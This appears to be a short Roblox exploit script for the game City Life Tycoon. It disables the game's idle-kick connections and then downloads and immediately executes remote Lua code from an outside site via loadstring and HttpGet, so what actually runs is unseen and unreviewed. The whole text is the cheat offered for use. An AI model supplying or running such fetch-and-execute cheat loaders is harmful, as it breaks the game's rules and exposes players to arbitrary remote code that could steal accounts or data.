-- Anti AFK
for i,v in pairs(getconnections(game:GetService("Players").LocalPlayer.Idled)) do
v:Disable()
end

loadstring(game:HttpGet("http://void-scripts.com/RIP/CityLifeTycoon.lua", true))()